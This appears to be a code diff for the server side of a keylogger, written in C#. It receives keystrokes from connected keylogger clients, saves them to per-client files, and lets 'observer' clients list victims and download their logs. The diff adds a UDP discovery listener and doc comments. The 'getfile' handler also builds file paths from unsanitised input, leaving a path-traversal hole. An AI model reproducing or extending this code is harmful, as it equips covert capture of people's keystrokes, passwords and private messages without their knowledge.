@@ -11,6 +11,9 @@ using Common;
 
 namespace ServerCore
 {
+    /// <summary>
+    /// Represents a server that handles keylogger clients and observer clients.
+    /// </summary>
     public class KeyloggerServer : ISubject
     {
         public readonly List<ClientHandler> _clients = new List<ClientHandler>();
@@ -19,6 +22,11 @@ namespace ServerCore
         private TcpListener _listener;
         public bool _running = false;
 
+        /// <summary>
+        /// Starts the server and listens for incoming connections.
+        /// </summary>
+        /// <param name="cancellationToken">Token to stop the server gracefully.</param>
+        /// <returns>A task representing the asynchronous server operation.</returns>
         public async Task RunAsync(CancellationToken cancellationToken = default)
         {
             Console.WriteLine("Starting server on port 5000...");
@@ -27,20 +35,26 @@ namespace ServerCore
             _listener = new TcpListener(IPAddress.Any, 5000);
             _listener.Start();
 
+            // Start the UDP discovery listener in the background
+            var discoveryListener = new DiscoveryListener();
+            _ = Task.Run(() => discoveryListener.StartAsync(6000), cancellationToken);
+
             _running = true;
             Console.WriteLine("Server is running. Press Ctrl+C to stop...");
-            //_ = Task.Run(AcceptClientsLoop);
 
-            //await Task.Delay(Timeout.Infinite); // menține serverul activ la nesfârșit
             try
             {
                 var acceptTask = Task.Run(() => AcceptClientsLoop(), cancellationToken);
 
-                // Așteptăm fie cancelare, fie până când serverul este oprit
+                // Wait until cancellation requested or server stops
                 while (_running && !cancellationToken.IsCancellationRequested)
                 {
                     await Task.Delay(1000, cancellationToken);
                 }
+            }
+            catch (OperationCanceledException)
+            {
+                // Expected on cancellation
             }
             finally
             {
@@ -49,6 +63,7 @@ namespace ServerCore
                 Console.WriteLine("Server stopped");
             }
         }
+
 
         public async Task StopAsync()
         {
@@ -74,6 +89,10 @@ namespace ServerCore
             await Task.CompletedTask;
         }
 
+        /// <summary>
+        /// Continuously accepts incoming clients and handles them based on their role (client or observer).
+        /// </summary>
+        /// <returns>A task representing the asynchronous loop operation.</returns>
         private async Task AcceptClientsLoop()
         {
             while (_running)
@@ -105,11 +124,16 @@ namespace ServerCore
                 }
                 catch (Exception ex)
                 {
-                    throw new KeyloggerException("Failed to accept or process incoming client.", ex);
+                    Console.WriteLine($"Failed to accept or process incoming client: {ex.Message}");
                 }
             }
         }
 
+        /// <summary>
+        /// Reads the initial role string sent by a connected client.
+        /// </summary>
+        /// <param name="client">The TcpClient to read from.</param>
+        /// <returns>A string indicating the role (e.g., "client", "observer").</returns>
         private async Task<string> ReadRoleAsync(TcpClient client)
         {
             var buffer = new byte[10];
@@ -118,12 +142,17 @@ namespace ServerCore
             return Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim('\0', '\r', '\n', ' ');
         }
 
+        /// <summary>
+        /// Handles communication with a connected keylogger client, saving received keystrokes and notifying observers.
+        /// </summary>
+        /// <param name="handler">The client handler.</param>
+        /// <returns>A task representing the asynchronous operation.</returns>
         private async Task HandleClientAsync(ClientHandler handler)
         {
             var stream = handler.Stream;
             var buffer = new byte[1024];
             string safeFileName = handler.Id.Replace(":", "_");
-            string filePath = "SaveData\\" + safeFileName + ".txt";
+            string filePath = Path.Combine("SaveData", safeFileName + ".txt");
 
             StreamWriter writer = null;
 
@@ -146,7 +175,7 @@ namespace ServerCore
             }
             catch (Exception ex)
             {
-                throw new KeyloggerException($"Error while handling client {handler.Id}.", ex);
+                Console.WriteLine($"Error while handling client {handler.Id}: {ex.Message}");
             }
             finally
             {
@@ -159,79 +188,81 @@ namespace ServerCore
             }
         }
 
+        /// <summary>
+        /// Keeps an observer client connected and handles special commands like "list" or "getfile".
+        /// </summary>
+        /// <param name="observer">The observer client.</param>
+        /// <returns>A task representing the asynchronous operation.</returns>
         private async Task KeepAliveObserver(IObserver observer)
         {
             try
             {
-                while (_running)
+                var client = observer as ObserverClient;
+                var stream = client.Stream;
+                var buffer = new byte[1024];
+
+                while (_running && client.TcpClient.Connected)
                 {
-                    var client = observer as ObserverClient;
-                    var stream = client.Stream;
-                    var buffer = new byte[1024];
-
-                    while (_running && client.TcpClient.Connected)
+                    if (stream.DataAvailable)
                     {
-                        if (stream.DataAvailable)
+                        int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
+                        if (bytesRead == 0)
+                            break;
+
+                        string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
+                        Console.WriteLine("[Observer " + client.Id + "] Command: " + command);
+
+                        if (command.Equals("list", StringComparison.OrdinalIgnoreCase))
                         {
-                            int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
-                            if (bytesRead == 0)
-                                break;
-
-                            string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
-                            Console.WriteLine("[Observer " + client.Id + "] Command: " + command);
-
-                            if (command.Equals("list", StringComparison.OrdinalIgnoreCase))
+                            string response;
+                            lock (_lock)
                             {
-                                string response;
-                                lock (_lock)
-                                {
-                                    var ids = _clients.Select(c => c.Id);
-                                    response = "[LIST]" + string.Join("\n", ids);
-                                }
-
-                                byte[] responseData = Encoding.UTF8.GetBytes(response + "\n");
-                                await stream.WriteAsync(responseData, 0, responseData.Length);
+                                var ids = _clients.Select(c => c.Id);
+                                response = "[LIST]" + string.Join("\n", ids);
                             }
-                            else if (command.StartsWith("getfile", StringComparison.OrdinalIgnoreCase))
-                            {
-                                string clientId = command.Substring("getfile".Length).Trim();
-                                string safeFileName = clientId.Replace(":", "_");
-                                string filePath = Path.Combine("SaveData", safeFileName + ".txt");
-                                try
-                                {
-                                    if (File.Exists(filePath))
-                                    {
-                                        string fileContent;
 
-                                        using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
-                                        using (var sr = new StreamReader(fs))
-                                        {
-                                            fileContent = await sr.ReadToEndAsync();
-                                        }
-                                        byte[] response = Encoding.UTF8.GetBytes("[FILE]" + fileContent);
-                                        await stream.WriteAsync(response, 0, response.Length);
-                                    }
-                                    else
-                                    {
-                                        string errorMsg = "[ERROR]File not found";
-                                        byte[] response = Encoding.UTF8.GetBytes(errorMsg);
-                                        await stream.WriteAsync(response, 0, response.Length);
-                                    }
-                                }
-                                catch (Exception ex)
+                            byte[] responseData = Encoding.UTF8.GetBytes(response + "\n");
+                            await stream.WriteAsync(responseData, 0, responseData.Length);
+                        }
+                        else if (command.StartsWith("getfile", StringComparison.OrdinalIgnoreCase))
+                        {
+                            string clientId = command.Substring("getfile".Length).Trim();
+                            string safeFileName = clientId.Replace(":", "_");
+                            string filePath = Path.Combine("SaveData", safeFileName + ".txt");
+
+                            try
+                            {
+                                if (File.Exists(filePath))
                                 {
-                                    Console.WriteLine($"Error reading or sending file: {ex.Message}");                             
+                                    string fileContent;
+                                    using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                                    using (var sr = new StreamReader(fs))
+                                    {
+                                        fileContent = await sr.ReadToEndAsync();
+                                    }
+                                    byte[] response = Encoding.UTF8.GetBytes("[FILE]" + fileContent);
+                                    await stream.WriteAsync(response, 0, response.Length);
                                 }
+                                else
+                                {
+                                    string errorMsg = "[ERROR]File not found";
+                                    byte[] response = Encoding.UTF8.GetBytes(errorMsg);
+                                    await stream.WriteAsync(response, 0, response.Length);
+                                }
+                            }
+                            catch (Exception ex)
+                            {
+                                Console.WriteLine($"Error reading or sending file: {ex.Message}");
                             }
                         }
-
-                        await Task.Delay(100); // Small delay to prevent CPU spin
                     }
+
+                    await Task.Delay(100);
                 }
             }
             catch (Exception ex)
             {
-                throw new KeyloggerException($"Error while keeping observer {observer.Id} alive.", ex);
+                Console.WriteLine($"Error while keeping observer {observer.Id} alive: {ex.Message}");
             }
             finally
             {
@@ -241,16 +272,28 @@ namespace ServerCore
             }
         }
 
+        /// <summary>
+        /// Attaches an observer to the notification list.
+        /// </summary>
+        /// <param name="observer">The observer to attach.</param>
         public void Attach(IObserver observer)
         {
             lock (_lock) _observers.Add(observer);
         }
 
+        /// <summary>
+        /// Detaches an observer from the notification list.
+        /// </summary>
+        /// <param name="observer">The observer to detach.</param>
         public void Detach(IObserver observer)
         {
             lock (_lock) _observers.Remove(observer);
         }
 
+        /// <summary>
+        /// Notifies all observers with a new message.
+        /// </summary>
+        /// <param name="message">The message to send to observers.</param>
         public void Notify(string message)
         {
             lock (_lock)
